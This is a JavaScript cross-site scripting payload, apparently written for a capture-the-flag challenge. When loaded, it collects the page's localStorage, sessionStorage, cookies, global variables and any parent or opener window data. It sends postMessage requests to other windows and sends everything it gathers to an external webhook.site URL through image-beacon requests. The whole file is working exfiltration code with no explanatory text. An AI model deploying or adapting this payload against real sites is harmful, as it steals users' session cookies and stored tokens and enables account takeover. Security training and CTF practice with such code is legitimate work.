     console.log('🎯 CROSS-ORIGIN PAYLOAD LOADED');

     // Send immediate confirmation
     function sendViaImage(data) {
         try {
             const img = new Image();
             const params = new URLSearchParams();
             Object.keys(data).forEach(key => {
                 params.append(key, typeof data[key] === 'object' ?
     JSON.stringify(data[key]) : data[key]);
             });
             img.src =
     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/cross?' +
     params.toString();
             document.body.appendChild(img);
             console.log('Data sent via image');
         } catch(e) { console.error('Image method failed:', e); }
     }

     sendViaImage({
         status: 'CROSS_ORIGIN_PAYLOAD_START',
         timestamp: new Date().toISOString(),
         current_domain: window.location.hostname,
         current_url: window.location.href,
         user_agent: navigator.userAgent
     });

     // Try multiple approaches to get the flag
     try {
         console.log('Searching for flag across all possible locations...');

         // Method 1: Check current domain localStorage
         const currentStorage = {};
         const currentKeys = [];
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
             currentStorage[key] = value;
             currentKeys.push(key);
         }

         // Method 2: Check sessionStorage
         const sessionData = {};
         const sessionKeys = [];
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             const value = sessionStorage.getItem(key);
             sessionData[key] = value;
             sessionKeys.push(key);
         }

         // Method 3: Check cookies
         const cookies = document.cookie;

         // Method 4: Check global variables for flag
         const globalFlag = window.flag || window.FLAG || window.ctfFlag;

         // Method 5: Try to access parent/opener window if exists
         let parentData = null;
         let openerData = null;

         try {
             if (window.parent && window.parent !== window) {
                 parentData = {
                     href: window.parent.location.href,
                     hostname: window.parent.location.hostname,
                     localStorage_length: window.parent.localStorage.length
                 };
             }
         } catch(e) { console.log('Parent access blocked:', e.message); }

         try {
             if (window.opener) {
                 openerData = {
                     href: window.opener.location.href,
                     hostname: window.opener.location.hostname,
                     localStorage_length: window.opener.localStorage.length
                 };
             }
         } catch(e) { console.log('Opener access blocked:', e.message); }

         // Method 6: Try to create iframe to CTF domain and access its 
     localStorage
         function tryIframeAccess() {
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = 'about:blank'; // Start with blank to avoid CORS 
     initially

             iframe.onload = function() {
                 try {
                     // Try to access iframe's localStorage
                     const iframeStorage = iframe.contentWindow.localStorage;
                     console.log('Iframe localStorage accessible');

                     // Send iframe data
                     sendViaImage({
                         status: 'IFRAME_ACCESS_SUCCESS',
                         iframe_storage_length: iframeStorage.length,
                         timestamp: new Date().toISOString()
                     });

                 } catch(e) {
                     console.log('Iframe access failed:', e.message);
                 }

                 // Clean up
                 setTimeout(() => {
                     if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
                 }, 2000);
             };

             document.body.appendChild(iframe);
         }

         // Execute iframe attempt
         setTimeout(tryIframeAccess, 1000);

         // Comprehensive data package
         const comprehensiveData = {
             status: 'COMPREHENSIVE_FLAG_SEARCH',
             timestamp: new Date().toISOString(),

             // Current domain data
             current_domain: window.location.hostname,
             current_url: window.location.href,
             current_localStorage: JSON.stringify(currentStorage),
             current_localStorage_keys: currentKeys.join(','),
             current_localStorage_length: currentKeys.length,

             // Session data
             sessionStorage_data: JSON.stringify(sessionData),
             sessionStorage_keys: sessionKeys.join(','),
             sessionStorage_length: sessionKeys.length,

             // Cookie data
             document_cookie: cookies || 'none',

             // Global variables
             global_flag: globalFlag || 'not_found',

             // Window relationships
             has_parent: window.parent !== window,
             has_opener: !!window.opener,
             parent_data: parentData ? JSON.stringify(parentData) : 'none',
             opener_data: openerData ? JSON.stringify(openerData) : 'none',

             // Environment info
             user_agent: navigator.userAgent,
             referrer: document.referrer || 'none',
             origin: window.location.origin,

             // Try direct flag access
             localStorage_flag: localStorage.getItem('flag') || 'not_found',
             sessionStorage_flag: sessionStorage.getItem('flag') || 'not_found',

             // Check for common flag patterns in DOM
             dom_text_contains_flag: document.body.textContent.includes('flag{') ||
      document.body.textContent.includes('FLAG{'),

             // Page title and meta
             page_title: document.title,
             page_meta: document.head.innerHTML.includes('flag') ||
     document.head.innerHTML.includes('FLAG')
         };

         console.log('Sending comprehensive flag search data...');
         sendViaImage(comprehensiveData);

         // Try postMessage to communicate with other windows
         if (window.parent !== window) {
             try {
                 window.parent.postMessage({
                     type: 'FLAG_REQUEST',
                     timestamp: new Date().toISOString()
                 }, '*');
             } catch(e) {}
         }

         if (window.opener) {
             try {
                 window.opener.postMessage({
                     type: 'FLAG_REQUEST',
                     timestamp: new Date().toISOString()
                 }, '*');
             } catch(e) {}
         }

         // Listen for postMessage responses
         window.addEventListener('message', function(event) {
             sendViaImage({
                 status: 'POSTMESSAGE_RECEIVED',
                 timestamp: new Date().toISOString(),
                 message_origin: event.origin,
                 message_data: JSON.stringify(event.data)
             });
         });

     } catch (error) {
         console.error('Cross-origin payload error:', error);

         sendViaImage({
             status: 'CROSS_ORIGIN_PAYLOAD_ERROR',
             error_message: error.message,
             error_stack: error.stack || 'no_stack',
             timestamp: new Date().toISOString()
         });
     }

     console.log('🏁 Cross-origin payload completed');
